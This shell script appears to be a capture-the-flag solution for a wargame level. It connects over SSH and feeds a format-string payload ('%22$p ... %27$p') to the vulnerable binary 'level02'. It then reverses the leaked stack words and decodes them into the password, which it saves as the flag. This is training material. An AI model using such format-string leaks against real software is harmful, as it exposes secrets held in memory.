#!/usr/bin/env sh

### GLOBALS ###

CURR_DIR_PATH="$(cd "$(dirname "$0")" && pwd)";

### SOURCES ###

. "$CURR_DIR_PATH/../../common/ssh/ssh_session.sh";
. "$CURR_DIR_PATH/.sshid.sh";

# ##### #
# UTILS #
# ##### #

log() {
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] $*";
}

flip_hex_words() {
    sed -E 's/(..)(..)(..)(..)(..)(..)(..)(..)/\8\7\6\5\4\3\2\1/';
}

hex_to_ascii() {
    tr -d '\n' | xxd -r -p;
}

# #### #
# MAIN #
# #### #

main() {
    # /!\ $host $port $username and $sshid_password are defined in the source '.sshid.sh' file.
    flag=""

    # Payload(s)

    # Resolution

    log "Authenticating to SSH server at $host:$port with username '$username'...";
    SSHPASS="$(sshid_password)" ssh_initialize_socket "$host" "$port" "$username" || { log "Error: Failed to initialize SSH socket."; return 1; };
    raw_password="$(ssh_exec_via_socket "$host" "$port" "$username" "(printf '%s\n' '%22\$p %23\$p %24\$p %25\$p %26\$p %27\$p'; printf '%s\n' '') | ~/level02 | grep -oE '[0-9a-f]{16}'")";
    ascii_password="$(printf '%s' "$raw_password" | flip_hex_words | hex_to_ascii)";
    flag="$ascii_password";
    ssh_destroy_socket "$host" "$port" "$username" || { log "Error: Failed to destroy SSH socket."; return 1; };

    if [ -z "$flag" ]; then
        log "Error: flag is empty. Something went wrong.";
        return 1;
    fi

    flag_path="$CURR_DIR_PATH/../flag";
    printf '%s' "$flag" > "$flag_path";
    log "Flag '$flag' has been written to '$flag_path'";
}

main "$@";
